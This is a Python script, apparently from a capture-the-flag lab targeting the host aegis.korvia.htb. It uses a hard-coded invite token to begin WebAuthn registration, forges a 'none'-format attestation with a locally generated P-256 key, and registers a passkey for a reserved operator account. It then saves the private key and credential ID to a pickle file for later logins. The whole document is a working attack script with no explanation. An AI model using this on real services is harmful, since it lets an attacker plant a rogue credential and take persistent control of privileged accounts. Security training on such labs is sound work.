#!/usr/bin/env python3
import os
import json
import hashlib
import struct
import pickle
import requests
import cbor2
from fido2.utils import websafe_decode, websafe_encode
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes, serialization

# ============ CONFIGURATION ============
BASE = "http://aegis.korvia.htb:3000"
RP_ID = "aegis.korvia.htb"
ORIGIN = "http://aegis.korvia.htb:3000"
TOKEN = "dad657731b2c7a2190fa167b388a2ddbc17b78ba6c6be1c3b169c4cff97a5238"
# =======================================

# Initialize session
s = requests.Session()

# Step 1: Begin WebAuthn registration
print("[+] Starting WebAuthn registration...")
r = s.post(
    f"{BASE}/api/v1/auth/webauthn/register/begin",
    json={"invite_token": TOKEN}
)
r.raise_for_status()
opts = r.json()

# Extract challenge and user info
challenge = websafe_decode(opts["challenge"])
user_id = websafe_decode(opts["user"]["id"])
print(f"[+] Reserved operator user_id: {user_id.decode()}")

# Step 2: Generate key pair
priv = ec.generate_private_key(ec.SECP256R1())
pn = priv.public_key().public_numbers()

# Helper function
i2b = lambda n: n.to_bytes(32, "big")

# COSE key format
cose_pub = {
    1: 2,      # kty: EC2
    3: -7,     # alg: ES256
    -1: 1,     # crv: P-256
    -2: i2b(pn.x),  # x-coordinate
    -3: i2b(pn.y)   # y-coordinate
}

# Step 3: Create credential
cred_id = os.urandom(32)
rp_id_hash = hashlib.sha256(RP_ID.encode()).digest()

# Auth data flags
flags = 0x41  # UP (User Present) | AT (Attested)
counter = struct.pack(">I", 1)
aaguid = b"\x00" * 16

# Build attested credential data
attested = (
    aaguid + 
    struct.pack(">H", len(cred_id)) + 
    cred_id + 
    cbor2.dumps(cose_pub)
)

# Build authenticator data
auth_data = rp_id_hash + bytes([flags]) + counter + attested

# Build attestation object
attestation_obj = cbor2.dumps({
    "fmt": "none",
    "attStmt": {},
    "authData": auth_data
})

# Build client data
client_data = json.dumps({
    "type": "webauthn.create",
    "challenge": websafe_encode(challenge),
    "origin": ORIGIN,
    "crossOrigin": False,
}, separators=(",", ":")).encode()

# Step 4: Complete registration
body = {
    "id": websafe_encode(cred_id),
    "rawId": websafe_encode(cred_id),
    "type": "public-key",
    "response": {
        "clientDataJSON": websafe_encode(client_data),
        "attestationObject": websafe_encode(attestation_obj),
    },
    "clientExtensionResults": {},
}

# Send finish request
r = s.post(
    f"{BASE}/api/v1/auth/webauthn/register/finish",
    json=body
)
print(f"[+] Register/finish: {r.status_code} {r.text}")
r.raise_for_status()

# Step 5: Save credential
priv_pem = priv.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption(),
)

with open("aegis_cred.pkl", "wb") as f:
    pickle.dump({
        "priv_pem": priv_pem,
        "cred_id": cred_id,
        "user_id": user_id
    }, f)

print("[+] Credential saved to ./aegis_cred.pkl")
print("[+] Done!")
